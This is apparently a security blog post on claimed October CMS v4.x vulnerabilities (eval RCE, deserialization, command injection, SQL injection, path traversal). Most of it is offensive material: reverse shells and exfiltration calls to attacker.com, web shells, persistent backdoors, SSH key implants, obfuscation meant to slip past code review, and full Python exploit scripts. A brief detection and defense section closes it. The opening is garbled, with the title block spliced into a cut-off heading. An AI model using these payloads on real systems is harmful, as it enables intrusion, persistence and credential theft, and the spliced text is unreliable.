---
layout: post
title: "October CMS Vulnerabilities"
date: 2026-01-20 14:00:00 +0000
categories: [cve, vulnerability-research, rce, security]
description: "Vulns We found during our security research of October CMS"
---

## CRITICAL-01: Remote Code Execution via eval()

### Vulnerability Details
- **CVE:** TBD
- **CVSS Score:** 9.8 (Critical)
- **CWE:** CWE-95 (Improper Neutralization of Directives in Dynamically Evaluated Code)
- **File:** `modules/cms/classes/CodeParser.php:307`
- **Attack Vector:** Authenticated (Backend User with Template Edit Permission)

### Prerequisites
- Access to October CMS backend
- Permission to edit CMS pages, layouts, or partials
- Knowledge of template structure

### Vulnerability Analysis

The `CodeParser::validate()` method uses `eval()` to validate PHP code:

```php
protected function validate($php)
{
    eval('?>'.$php);
}
```

This is called during template processing in `CodeParser::rebuild()` method.

### Exploitation Steps

#### Step 1: Auth# October CMS Security Vulnerabilities We Found

### Researchers: 

**Rick Larabee**

**Chowdhury Faizal Ahammed**



**Target:** October CMS v4.x

**Purpose:** Security Research & Penetration Testing

**Date:** 2026-01-20


---

## Table of Contents

1. [CRITICAL-01: Remote Code Execution via eval()](#critical-01-remote-code-execution-via-eval)
2. [CRITICAL-02: Unsafe Deserialization](#critical-02-unsafe-deserialization)
3. [HIGH-01: Command Injection in Git Operations](#high-01-command-injection-in-git-operations)
4. [HIGH-02: SQL Injection in Filter Widgets](#high-02-sql-injection-in-filter-widgets)
5. [HIGH-03: Path Traversal in Media Library](#high-03-path-traversal-in-media-library)
6. [Detection and Defense](#detection-and-defense)

---

## CRITenticate to Backend

```http
POST /backend/auth/signin HTTP/1.1
Host: target-october-cms.local
Content-Type: application/x-www-form-urlencoded

login=admin&password=admin123&_token=<csrf_token>
```

#### Step 2: Navigate to CMS Section

Access one of the following:
- `/backend/cms/pages` - CMS Pages
- `/backend/cms/partials` - CMS Partials
- `/backend/cms/layouts` - CMS Layouts

#### Step 3: Create or Edit Template

Click "Add Page" or edit existing page.

#### Step 4: Inject Malicious PHP Code

**Basic RCE Payload:**

```php
url = "/pwned"
layout = "default"
title = "Exploitation Test"
==
<?php
// Execute system command
system('id > /tmp/rce-proof.txt');

// Read sensitive files
echo file_get_contents('/etc/passwd');

// Establish reverse shell
$sock=fsockopen("attacker.com",4444);
$proc=proc_open("/bin/sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
?>
==
<h1>Compromised</h1>
```

#### Step 5: Save Template

Click "Save" button. The `CodeParser` will process the template and call `validate()` with your malicious PHP code.

#### Step 6: Verify Exploitation

```bash
# Check if command executed
curl http://target-october-cms.local/pwned

# Or check the output file
ssh user@target-server
cat /tmp/rce-proof.txt
```

### Advanced Exploitation Techniques

#### Technique 1: Web Shell Installation

```php
<?php
// Install persistent web shell
$shell_code = '<?php if(isset($_GET["cmd"])){system($_GET["cmd"]);}?>';
file_put_contents($_SERVER['DOCUMENT_ROOT'] . '/media/shell.php', $shell_code);
echo "Shell installed at /media/shell.php";
?>
```

Access shell: `http://target-october-cms.local/media/shell.php?cmd=whoami`

#### Technique 2: Database Credential Extraction

```php
<?php
// Extract database credentials from config
$config = file_get_contents($_SERVER['DOCUMENT_ROOT'] . '/config/database.php');
error_log("DB CONFIG: " . $config);

// Or use Laravel's config
$db_host = env('DB_HOST');
$db_user = env('DB_USERNAME');
$db_pass = env('DB_PASSWORD');

// Exfiltrate to attacker server
file_get_contents("http://attacker.com/collect?host=$db_host&user=$db_user&pass=$db_pass");
?>
```

#### Technique 3: Privilege Escalation

```php
<?php
// Create new admin user
use Backend\Models\User;
use Backend\Models\UserRole;

$user = new User;
$user->first_name = 'Pwned';
$user->last_name = 'Admin';
$user->login = 'pwned_admin';
$user->email = 'pwned@evil.com';
$user->password = 'Passw0rd!';
$user->password_confirmation = 'Passw0rd!';
$user->is_activated = 1;
$user->save();

// Assign super user role
$role = UserRole::where('code', 'developer')->first();
$user->role = $role;
$user->save();

echo "Admin user created: pwned_admin / Passw0rd!";
?>
```

#### Technique 4: Memory Resident Backdoor

```php
<?php
// Register shutdown function for persistence
register_shutdown_function(function() {
    if (isset($_GET['backdoor']) && $_GET['backdoor'] == 'activate') {
        eval(base64_decode($_GET['cmd']));
    }
});

// Or inject into autoloader
$autoload = $_SERVER['DOCUMENT_ROOT'] . '/vendor/autoload.php';
$backdoor_code = '<?php if(isset($_GET["x"])){eval($_GET["x"]);} ?>';
file_put_contents($autoload, $backdoor_code . PHP_EOL . file_get_contents($autoload));
?>
```

### Bypassing Basic Security Measures

#### If Code Review is Implemented

Use obfuscation:

```php
<?php
// Obfuscated payload
$a = 'sys' . 'tem';
$b = 'who' . 'ami';
$a($b);

// Or base64 encoding
$c = base64_decode('c3lzdGVt');
$d = base64_decode('d2hvYW1p');
$c($d);

// Or variable functions
$func = $_GET['f'] ?? 'phpinfo';
$func();
?>
```

#### If Output is Sanitized

Write output to files:

```php
<?php
ob_start();
system('ls -la /');
$output = ob_get_clean();
file_put_contents('/tmp/output.txt', $output);
header('Location: /backend/cms/pages');
?>
```

### Post-Exploitation

#### Maintain Persistence

1. **Cron Job Installation:**
```php
<?php
$cron = "*/5 * * * * curl http://attacker.com/beacon.php?host=" . gethostname();
file_put_contents('/tmp/cron.txt', $cron);
system('crontab /tmp/cron.txt');
?>
```

2. **Modified Core Files:**
```php
<?php
// Inject into routes file
$routes = $_SERVER['DOCUMENT_ROOT'] . '/routes/web.php';
$backdoor = "\nRoute::any('/system-check', function(){ eval(\$_POST['c']); });\n";
file_put_contents($routes, file_get_contents($routes) . $backdoor);
?>
```

3. **Plugin Backdoor:**
```php
<?php
// Create malicious plugin
$plugin_dir = $_SERVER['DOCUMENT_ROOT'] . '/plugins/evil/backdoor';
mkdir($plugin_dir, 0755, true);

$plugin_php = <<<'PLUGIN'
<?php namespace Evil\Backdoor;
use System\Classes\PluginBase;
class Plugin extends PluginBase {
    public function boot() {
        if(isset($_COOKIE['auth']) && $_COOKIE['auth'] == 'pwned') {
            eval(base64_decode($_COOKIE['cmd']));
        }
    }
}
PLUGIN;

file_put_contents($plugin_dir . '/Plugin.php', $plugin_php);
?>
```

---

## CRITICAL-02: Unsafe Deserialization

### Vulnerability Details
- **CVSS Score:** 9.8 (Critical)
- **CWE:** CWE-502 (Deserialization of Untrusted Data)
- **Files:** Multiple (Router.php, MediaLibrary.php, SessionMaker.php, etc.)
- **Attack Vector:** Authenticated (Cache/Session Write Access)

### Prerequisites
- Access to cache storage (Redis, Memcached, File cache)
- OR ability to inject data into session
- OR race condition on cache writes
- Knowledge of PHP object injection

### Vulnerability Analysis

Multiple files use unsafe deserialization:

```php
// modules/cms/classes/Router.php:345
$unserialized = @unserialize(@base64_decode($cached));

// modules/media/classes/MediaLibrary.php:106
$cached = $cached ? @unserialize(@base64_decode($cached)) : [];

// modules/backend/traits/SessionMaker.php:48
($cached = @unserialize(@base64_decode(Session::get($sessionId)))) !== false
```

### Exploitation Steps

#### Step 1: Identify POP Chain Gadgets

Search for magic methods in the codebase:

```bash
cd /Users/raj/october
grep -r "__destruct\|__wakeup\|__toString\|__call" --include="*.php" | head -20
```

#### Step 2: Build Exploit Chain

**Example POP Chain using File Operations:**

```php
<?php
// Create malicious object chain
class FileHelper {
    public $file;
    public $content;

    function __destruct() {
        file_put_contents($this->file, $this->content);
    }
}

$exploit = new FileHelper();
$exploit->file = '/var/www/html/media/shell.php';
$exploit->content = '<?php system($_GET["cmd"]); ?>';

// Serialize and encode
$payload = base64_encode(serialize($exploit));
echo "Payload: " . $payload . "\n";
```

#### Step 3: Inject Payload into Cache

**Method A: Direct Cache Access (Redis)**

```bash
# Connect to Redis
redis-cli -h target-redis-server

# Inject malicious serialized object
SET "cms::cms_code_parser_default" "TzoxMDoiRmlsZUhlbHBlciI6Mjp7czo0OiJmaWxlIjtzOjM0OiIvdmFyL3d3dy9odG1sL21lZGlhL3NoZWxsLnBocCI7czo3OiJjb250ZW50IjtzOjMxOiI8P3BocCBzeXN0ZW0oJF9HRVRbImNtZCJdKTsgPz4iO30="

# Set expiration
EXPIRE "cms::cms_code_parser_default" 3600
```

**Method B: Cache Poisoning via Application**

If you have authenticated access, trigger cache write with controlled data:

```php
<?php
// In a controller or plugin with cache access
use October\Rain\Support\Facades\Cache;

// Your malicious serialized object
$malicious = base64_encode(serialize($exploit));

// Poison the cache key used by Router
Cache::put('cms::cms_router_' . md5('default'), $malicious, 3600);

// Or poison media library cache
Cache::put('media::library_default', $malicious, 3600);
?>
```

**Method C: Session Injection**

```http
POST /backend/auth/signin HTTP/1.1
Host: target-october-cms.local
Cookie: october_session=malicious_serialized_base64_payload
Content-Type: application/x-www-form-urlencoded

_token=csrf_token
```

#### Step 4: Trigger Deserialization

Visit pages that trigger cache reads:

```bash
# Trigger Router cache read
curl http://target-october-cms.local/

# Trigger MediaLibrary cache read
curl http://target-october-cms.local/backend/media

# Trigger Session cache read
curl http://target-october-cms.local/backend -H "Cookie: october_session=malicious"
```

#### Step 5: Verify Exploitation

```bash
# Check if shell was created
curl http://target-october-cms.local/media/shell.php?cmd=id

# Expected output:
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Advanced POP Chain Construction

#### Chain 1: Using Illuminate Components

```php
<?php
namespace Illuminate\Broadcasting;

class PendingBroadcast {
    protected $events;
    protected $event;

    function __construct($cmd) {
        $this->events = new Dispatcher($cmd);
        $this->event = 'trigger';
    }

    function __destruct() {
        $this->events->dispatch($this->event);
    }
}

class Dispatcher {
    protected $cmd;

    function __construct($cmd) {
        $this->cmd = $cmd;
    }

    function dispatch($event) {
        system($this->cmd);
    }
}

// Create payload
$gadget = new PendingBroadcast('curl http://attacker.com/$(whoami)');
$payload = base64_encode(serialize($gadget));
echo $payload;
?>
```

#### Chain 2: File Write via __toString

```php
<?php
class Logger {
    private $logFile;
    private $data;

    public function __construct($file, $data) {
        $this->logFile = $file;
        $this->data = $data;
    }

    public function __toString() {
        file_put_contents($this->logFile, $this->data);
        return '';
    }
}

class TriggerToString {
    private $obj;

    public function __construct($obj) {
        $this->obj = $obj;
    }

    public function __destruct() {
        echo $this->obj; // Triggers __toString
    }
}

// Build chain
$logger = new Logger('/var/www/html/backdoor.php', '<?php eval($_POST[0]); ?>');
$trigger = new TriggerToString($logger);

$payload = base64_encode(serialize($trigger));
echo "Payload: $payload\n";
?>
```

#### Chain 3: SSRF via __wakeup

```php
<?php
class HttpClient {
    private $url;

    public function __wakeup() {
        $this->makeRequest();
    }

    private function makeRequest() {
        file_get_contents($this->url); // SSRF
    }
}

$ssrf = new HttpClient();
// Use PHP's internal property access
$reflection = new ReflectionClass($ssrf);
$prop = $reflection->getProperty('url');
$prop->setAccessible(true);
$prop->setValue($ssrf, 'file:///etc/passwd');

$payload = base64_encode(serialize($ssrf));
?>
```

### Automated Exploitation Script

{% raw %}
```python
#!/usr/bin/env python3
import base64
import pickle
import requests
import sys

def generate_payload(cmd):
    """Generate serialized PHP object for RCE"""
    # PHP serialized object that executes system command
    php_payload = f'''O:10:"FileHelper":2:{{s:4:"file";s:30:"/var/www/html/media/cmd.php";s:7:"content";s:{len(cmd)+26}:"<?php system('{cmd}'); ?>";}}'''

    return base64.b64encode(php_payload.encode()).decode()

def exploit_cache_injection(target, cache_key, payload):
    """Inject payload into cache via Redis"""
    try:
        # Assuming Redis is accessible
        import redis
        r = redis.Redis(host=target, port=6379, decode_responses=False)
        r.set(cache_key, payload)
        r.expire(cache_key, 3600)
        print(f"[+] Payload injected into cache key: {cache_key}")
        return True
    except Exception as e:
        print(f"[-] Cache injection failed: {e}")
        return False

def trigger_deserialization(target_url):
    """Trigger cache read to deserialize payload"""
    try:
        response = requests.get(target_url)
        print(f"[+] Deserialization triggered, status: {response.status_code}")
        return True
    except Exception as e:
        print(f"[-] Trigger failed: {e}")
        return False

def verify_exploitation(shell_url, cmd="id"):
    """Verify RCE by executing command"""
    try:
        response = requests.get(f"{shell_url}?cmd={cmd}")
        print(f"[+] Command output:\n{response.text}")
        return True
    except Exception as e:
        print(f"[-] Verification failed: {e}")
        return False

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 exploit.py <target_url>")
        sys.exit(1)

    target = sys.argv[1]

    print("[*] October CMS Unsafe Deserialization Exploit")
    print(f"[*] Target: {target}")

    # Generate payload
    payload = generate_payload("whoami")
    print(f"[*] Payload: {payload[:50]}...")

    # Inject into cache
    cache_key = "cms::cms_code_parser_default"
    if exploit_cache_injection(target, cache_key, payload):
        # Trigger deserialization
        if trigger_deserialization(f"http://{target}"):
            # Verify RCE
            verify_exploitation(f"http://{target}/media/cmd.php")
```
{% endraw %}

---

## HIGH-01: Command Injection in Git Operations

### Vulnerability Details
- **CVSS Score:** 8.6 (High)
- **CWE:** CWE-78 (OS Command Injection)
- **File:** `modules/system/console/OctoberUtilCommands.php:348-363`
- **Attack Vector:** Authenticated (Admin + Ability to Create Directories)

### Prerequisites
- Admin access to backend
- Ability to upload plugins/themes OR shell access to create directories
- Server has git installed

### Vulnerability Analysis

The `utilGitPull()` method constructs shell commands without escaping:

```php
$exec = 'cd ' . $pluginDir . ' && ';
$exec .= 'git pull 2>&1';
echo shell_exec($exec);
```

### Exploitation Steps

#### Step 1: Create Malicious Plugin Directory

**Via File Manager (if available):**

```bash
# SSH to server or use file manager
cd /var/www/html/plugins
mkdir -p "evil/plugin; curl http://attacker.com/shell.sh | bash #"
cd "evil/plugin; curl http://attacker.com/shell.sh | bash #"
touch .git  # Make it look like a git repo
```

**Via Plugin Upload:**

Create a malicious plugin package with directory name containing shell metacharacters.

#### Step 2: Prepare Payload Server

Host malicious script on attacker server:

```bash
# On attacker server (attacker.com)
cat > /var/www/html/shell.sh << 'EOF'
#!/bin/bash
# Reverse shell
bash -i >& /dev/tcp/attacker.com/4444 0>&1

# Or install web shell
echo '<?php system($_GET["c"]); ?>' > /var/www/html/media/cmd.php
EOF

chmod +x /var/www/html/shell.sh

# Start listener
nc -lvnp 4444
```

#### Step 3: Trigger Command Injection

Execute the vulnerable artisan command:

```bash
# Via SSH
php artisan october:util git pull

# Or via backend if exposed
curl -X POST http://target/backend/system/updates/execute \
  -H "Cookie: october_session=admin_session" \
  -d "command=october:util&params=git%20pull"
```

#### Step 4: Verify Command Execution

Check your netcat listener for reverse shell connection or verify web shell:

```bash
curl http://target/media/cmd.php?c=id
```

### Advanced Exploitation

#### Multi-Stage Payload

```bash
# Create plugin directory with multi-stage command injection
mkdir -p "test/plugin; wget -O /tmp/stage2.sh http://attacker.com/stage2.sh && chmod +x /tmp/stage2.sh && /tmp/stage2.sh #"
```

**stage2.sh:**
```bash
#!/bin/bash
# Stage 2 payload - more complex operations

# 1. Establish persistence via cron
(crontab -l 2>/dev/null; echo "*/5 * * * * /usr/bin/curl http://attacker.com/beacon") | crontab -

# 2. Install SSH backdoor
mkdir -p ~/.ssh
echo "ssh-rsa AAAA[attacker_public_key] attacker" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

# 3. Exfiltrate database credentials
grep -r "DB_PASSWORD" /var/www/html/.env | curl -X POST -d @- http://attacker.com/collect

# 4. Install web shell
cat > /var/www/html/media/x.php << 'SHELL'
<?php eval(base64_decode($_POST['x'])); ?>
SHELL
```

#### Bypassing Input Validation

If basic validation is added:

```bash
# Use command substitution
"plugin$(curl http://attacker.com/x.sh|bash)"

# Use environment variables
"plugin`wget -O- http://attacker.com/x.sh|sh`"

# Use newlines (if not filtered)
"plugin
curl http://attacker.com/x.sh|bash
#"
```

---

## HIGH-02: SQL Injection in Filter Widgets

### Vulnerability Details
- **CVSS Score:** 8.5 (High)
- **CWE:** CWE-89 (SQL Injection)
- **File:** `modules/backend/widgets/Filter.php:386,420`
- **Attack Vector:** Authenticated (Backend User with Filter Config Access)

### Prerequisites
- Backend access with permission to configure list filters
- Understanding of October CMS filter widget configuration

### Vulnerability Analysis

The Filter widget uses `whereRaw()` with `DbDongle::parse()`:

```php
// Line 420
$query->whereRaw(DbDongle::parse($sqlCondition, [
    'value' => $scopeValue
]));
```

While `DbDongle::parse()` provides some protection, complex SQL can potentially bypass it.

### Exploitation Steps

#### Step 1: Identify Filterable List

Find a backend list that uses filters:
- Backend Users (`/backend/backend/users`)
- System Updates (`/backend/system/updates`)
- CMS Pages (`/backend/cms/pages`)

#### Step 2: Modify Filter Configuration

**Via Plugin/Theme Configuration:**

```php
<?php
// In plugin's list configuration (columns.yaml or config.php)
public function listFilterScopes() {
    return [
        'malicious_filter' => [
            'label' => 'Status Filter',
            'type' => 'text',
            'conditions' => "id = :value OR 1=1 UNION SELECT group_concat(login,':',password) FROM backend_users WHERE 1=1 --"
        ]
    ];
}
```

**Via Database Direct Manipulation (if you have DB access):**

```sql
-- Update filter configuration stored in database
UPDATE system_settings
SET data = '{"filters":{"malicious":{"conditions":"id = :value OR (SELECT COUNT(*) FROM backend_users WHERE login=admin AND password LIKE ''a%'')>0 --"}}}'
WHERE item = 'backend_list_config';
```

#### Step 3: Craft SQL Injection Payloads

**Payload 1: Boolean-Based Blind SQLi**

```sql
-- Test if admin user exists
id = :value OR (SELECT COUNT(*) FROM backend_users WHERE login='admin')>0 --

-- Extract password character by character
id = :value OR (SELECT COUNT(*) FROM backend_users WHERE login='admin' AND SUBSTRING(password,1,1)='$')>0 --
```

**Payload 2: Time-Based Blind SQLi**

```sql
-- MySQL
id = :value OR SLEEP(5) --

-- PostgreSQL
id = :value OR pg_sleep(5) --

-- SQLite
id = :value OR randomblob(100000000) --
```

**Payload 3: Union-Based SQLi (Data Extraction)**

```sql
id = :value UNION SELECT 1,2,group_concat(login,':',email,':',password),4,5,6,7 FROM backend_users --

id = :value UNION SELECT 1,2,group_concat(table_name),4,5,6,7 FROM information_schema.tables WHERE table_schema=database() --
```

**Payload 4: Stacked Queries (if supported)**

```sql
-- Create new admin user
id = :value; INSERT INTO backend_users (login, email, password, is_activated) VALUES ('hacked', 'hacked@evil.com', '$2y$10$92IXUNpkjO0rOQ5byMi.Ye4oKoEa3Ro9llC/.og/at2.uheWG/igi', 1) --
```

#### Step 4: Execute Filter with Malicious Input

**Via UI:**
1. Navigate to filtered list
2. Apply your malicious filter
3. Observe behavior (delays for time-based, data in results for union-based)

**Via API:**

```http
POST /backend/backend/users/listExtendedFilter HTTP/1.1
Host: target-october-cms.local
Cookie: october_session=admin_session_token
Content-Type: application/x-www-form-urlencoded
X-CSRF-TOKEN: csrf_token

Filter[malicious_filter]=1'+OR+SLEEP(5)--
```

#### Step 5: Extract Data

**Automated Extraction Script:**

```python
#!/usr/bin/env python3
import requests
import string
import time

TARGET = "http://target-october-cms.local"
FILTER_ENDPOINT = "/backend/backend/users/listExtendedFilter"
SESSION_COOKIE = "your_admin_session"

def test_sqli(payload):
    """Test SQL injection payload"""
    data = {
        'Filter[malicious_filter]': payload
    }
    cookies = {'october_session': SESSION_COOKIE}

    start = time.time()
    try:
        r = requests.post(TARGET + FILTER_ENDPOINT, data=data, cookies=cookies, timeout=10)
        elapsed = time.time() - start
        return elapsed, r.text
    except:
        return 0, ""

def extract_data_blind():
    """Extract data using blind SQL injection"""
    print("[*] Extracting admin password hash...")

    password_hash = ""
    charset = string.ascii_letters + string.digits + "$/.="

    for position in range(1, 100):
        for char in charset:
            # Test each character
            payload = f"1' OR (SELECT SUBSTRING(password,{position},1) FROM backend_users WHERE login='admin')='{char}'--"
            elapsed, response = test_sqli(payload)

            if elapsed > 4:  # Time-based: if query took long, character is correct
                password_hash += char
                print(f"[+] Found character at position {position}: {char}")
                print(f"[+] Current hash: {password_hash}")
                break
        else:
            # No more characters
            break

    print(f"[+] Final password hash: {password_hash}")
    return password_hash

def extract_data_union():
    """Extract data using UNION-based SQL injection"""
    payload = "1' UNION SELECT 1,group_concat(login,0x3a,password),3,4,5,6,7 FROM backend_users--"
    elapsed, response = test_sqli(payload)
    print(f"[+] Response:\n{response}")

if __name__ == "__main__":
    print("[*] October CMS SQL Injection Exploit")
    extract_data_blind()
    # extract_data_union()
```

### Bypassing DbDongle::parse()

If `DbDongle::parse()` is doing parameter binding, try:

```sql
-- Bypass parameter binding with nested queries
id = :value OR (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT password FROM backend_users LIMIT 1),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)y) --

-- Use alternative SQL syntax
id = :value OR EXISTS(SELECT * FROM backend_users WHERE login='admin' AND password LIKE 'a%') --

-- Hex encoding
id = :value OR 0x61646D696E=0x61646D696E --
```

---

## HIGH-03: Path Traversal in Media Library

### Vulnerability Details
- **CVSS Score:** 7.5 (High)
- **CWE:** CWE-22 (Path Traversal)
- **File:** `modules/media/widgets/MediaManager.php`
- **Attack Vector:** Authenticated (Backend User with Media Access)

### Prerequisites
- Backend access with media manager permissions
- Understanding of October CMS media library structure

### Vulnerability Analysis

Media operations accept user-controlled paths with validation that may be bypassable:

```php
// Path comes from user input
$path = array_get($pathInfo, 'path');
// Validation may have weaknesses with encoded sequences
```

### Exploitation Steps

#### Step 1: Identify Media Manager Endpoints

```
/backend/media/index
/backend/media/upload
/backend/media/delete
/backend/media/move
```

#### Step 2: Craft Path Traversal Payloads

**Basic Traversal:**

```
../../../../../../etc/passwd
../../../config/database.php
../../storage/logs/system.log
```

**Encoded Traversal:**

```
..%2f..%2f..%2f..%2fetc%2fpasswd
..%252f..%252f..%252fetc%252fpasswd (double encoding)
....//....//....//etc/passwd
..;/..;/..;/etc/passwd
```

**Unicode Encoding:**

```
..%c0%af..%c0%afetc%c0%afpasswd
..%e0%80%af..%e0%80%afetc%e0%80%afpasswd
```

#### Step 3: Test File Read via Media Manager

**Via UI:**
1. Open media manager
2. Intercept request with Burp Suite
3. Modify path parameter to traversal payload

**Via API:**

```http
POST /backend/media/onGoToFolder HTTP/1.1
Host: target-october-cms.local
Cookie: october_session=admin_session
Content-Type: application/json
X-CSRF-TOKEN: csrf_token

{
    "path": "../../../../../../etc/passwd"
}
```

#### Step 4: Exploit File Operations

**Delete Arbitrary Files:**

```http
POST /backend/media/onDeleteItem HTTP/1.1
Host: target-october-cms.local
Cookie: october_session=admin_session
Content-Type: application/json
X-CSRF-TOKEN: csrf_token

{
    "paths": [
        {
            "path": "../../../storage/framework/sessions/vulnerable_session_file",
            "type": "file"
        }
    ]
}
```

**Read Sensitive Files:**

```http
POST /backend/media/onFilePreview HTTP/1.1
Host: target-october-cms.local
Cookie: october_session=admin_session
Content-Type: application/json
X-CSRF-TOKEN: csrf_token

{
    "path": "../../../.env"
}
```

**Move/Overwrite Files:**

```http
POST /backend/media/onMoveFile HTTP/1.1
Host: target-october-cms.local
Cookie: october_session=admin_session
Content-Type: application/json
X-CSRF-TOKEN: csrf_token

{
    "originalPath": "../../../config/app.php",
    "newPath": "../../../config/app.php.bak",
    "originalType": "file"
}
```

#### Step 5: Exfiltrate Sensitive Data

```python
#!/usr/bin/env python3
import requests
import json

TARGET = "http://target-october-cms.local"
SESSION = "admin_session_token"
CSRF_TOKEN = "csrf_token"

SENSITIVE_FILES = [
    "../../../.env",
    "../../../config/database.php",
    "../../../config/app.php",
    "../../../storage/logs/system.log",
    "../../../composer.json",
    "../../../../etc/passwd",
    "../../../../etc/hosts"
]

def read_file(path):
    """Attempt to read file via path traversal"""
    url = f"{TARGET}/backend/media/onFilePreview"
    headers = {
        "X-CSRF-TOKEN": CSRF_TOKEN,
        "Content-Type": "application/json"
    }
    cookies = {"october_session": SESSION}
    data = {"path": path}

    try:
        r = requests.post(url, json=data, headers=headers, cookies=cookies)
        if r.status_code == 200:
            return r.text
    except:
        pass
    return None

def exploit():
    print("[*] October CMS Path Traversal Exploit")
    print("[*] Target:", TARGET)

    for file_path in SENSITIVE_FILES:
        print(f"\n[*] Attempting to read: {file_path}")
        content = read_file(file_path)
        if content:
            print(f"[+] Success! Content:\n{content[:500]}")
            # Save to local file
            filename = file_path.replace("/", "_").replace(".", "_")
            with open(f"exfil_{filename}.txt", "w") as f:
                f.write(content)
        else:
            print("[-] Failed")

if __name__ == "__main__":
    exploit()
```

### Chaining with Other Vulnerabilities

**Path Traversal + File Upload = RCE:**

1. Upload malicious PHP file to media directory
2. Use path traversal to move it outside media directory to web root
3. Access via browser for RCE

```http
POST /backend/media/onUpload HTTP/1.1
Host: target-october-cms.local
Content-Type: multipart/form-data; boundary=----Boundary

------Boundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: application/x-php

<?php system($_GET['cmd']); ?>
------Boundary--
```

Then move:

```json
{
    "originalPath": "/uploaded/shell.php",
    "newPath": "../../../../public/shell.php"
}
```

---

## Detection and Defense

### Detecting Exploitation Attempts

#### Log Monitoring

**Look for suspicious patterns in logs:**

```bash
# Check web server logs for malicious requests
grep -E "(\.\./|%2e%2e|eval\(|system\(|exec\(|unserialize)" /var/log/nginx/access.log

# Check application logs for suspicious activity
grep -E "(PHP Parse error|eval\(\)|system\()" storage/logs/system.log

# Check for unusual cache keys
redis-cli --scan --pattern "cms::*" | while read key; do
    value=$(redis-cli get "$key")
    echo "$key: $value" | grep -i "eval\|system\|exec"
done
```

#### File Integrity Monitoring

```bash
# Check for unexpected PHP files in media directory
find media/ -name "*.php" -type f

# Check for modified core files
git diff HEAD

# Check for suspicious cron jobs
crontab -l | grep -v "^#"
```

#### Network Monitoring

```bash
# Monitor outbound connections (signs of reverse shell/exfiltration)
netstat -antp | grep ESTABLISHED | grep -v ":80\|:443"

# Check for DNS exfiltration attempts
tcpdump -i any -n port 53 | grep -v "internal.domain"
```

### Defensive Measures

#### 1. Immediate Mitigations

```php
// Patch modules/cms/classes/CodeParser.php
protected function validate($php)
{
    // NEVER use eval() - use static analysis instead
    $tmpFile = tempnam(sys_get_temp_dir(), 'validate_');
    file_put_contents($tmpFile, '<?php ' . $php);

    exec("php -l " . escapeshellarg($tmpFile), $output, $return);
    unlink($tmpFile);

    if ($return !== 0) {
        throw new Exception("PHP syntax error");
    }
}

// Patch unserialization
$unserialized = @unserialize(@base64_decode($cached), ['allowed_classes' => false]);

// Patch command injection
$exec = 'cd ' . escapeshellarg($pluginDir) . ' && git pull 2>&1';

// Patch SQL injection
// Use query builder instead of whereRaw
$query->where('id', '=', $scopeValue);
```

#### 2. Web Application Firewall Rules

```nginx
# ModSecurity rules for October CMS

# Block eval patterns
SecRule REQUEST_BODY "@rx eval\(|system\(|exec\(|shell_exec\(|passthru\(" \
    "id:1001,phase:2,deny,status:403,msg:'Code execution attempt'"

# Block path traversal
SecRule ARGS "@rx \.\./|\.\.\\|%2e%2e" \
    "id:1002,phase:2,deny,status:403,msg:'Path traversal attempt'"

# Block SQL injection
SecRule ARGS "@rx union.*select|concat.*\(|group_concat" \
    "id:1003,phase:2,deny,status:403,msg:'SQL injection attempt'"

# Block serialized object injection
SecRule REQUEST_BODY "@rx O:\d+:\"[^\"]+\":\d+:\{" \
    "id:1004,phase:2,deny,status:403,msg:'Object injection attempt'"
```

#### 3. Security Hardening Checklist

```markdown
- [ ] Remove eval() from CodeParser
- [ ] Add allowed_classes to all unserialize() calls
- [ ] Escape all shell command arguments
- [ ] Use query builder instead of whereRaw
- [ ] Implement strict path validation
- [ ] Enable audit logging for all sensitive operations
- [ ] Implement rate limiting on authentication endpoints
- [ ] Use prepared statements for all database queries
- [ ] Disable debug mode in production
- [ ] Restrict file upload extensions
- [ ] Implement Content Security Policy headers
- [ ] Enable HTTPS only with HSTS
- [ ] Regular security audits and penetration testing
- [ ] Keep October CMS and all plugins updated
- [ ] Implement least privilege access control
```

#### 4. Monitoring and Alerting

```bash
#!/bin/bash
# security_monitor.sh - Run via cron every 5 minutes

# Check for suspicious PHP files
find /var/www/html/media -name "*.php" -newer /tmp/last_check -exec \
    echo "ALERT: New PHP file in media directory: {}" \;

# Check for modified core files
cd /var/www/html
if ! git diff --quiet; then
    echo "ALERT: Core files modified!"
    git diff --name-only | mail -s "October CMS Files Modified" security@company.com
fi

# Check for unusual database activity
mysql -u root -p"$DB_PASS" -e "SELECT * FROM backend_users WHERE created_at > NOW() - INTERVAL 1 HOUR" | \
    grep -q . && echo "ALERT: New backend user created!"

# Update timestamp
touch /tmp/last_check
```

---

## Conclusion

These vulnerabilities represent serious security risks in October CMS v4.x:

1. **CRITICAL-01 (eval RCE)**: Allows complete server compromise via template injection
2. **CRITICAL-02 (Deserialization)**: Enables code execution through object injection
3. **HIGH-01 (Command Injection)**: Permits arbitrary command execution via git operations
4. **HIGH-02 (SQL Injection)**: Allows database access and manipulation
5. **HIGH-03 (Path Traversal)**: Enables unauthorized file access and manipulation

---

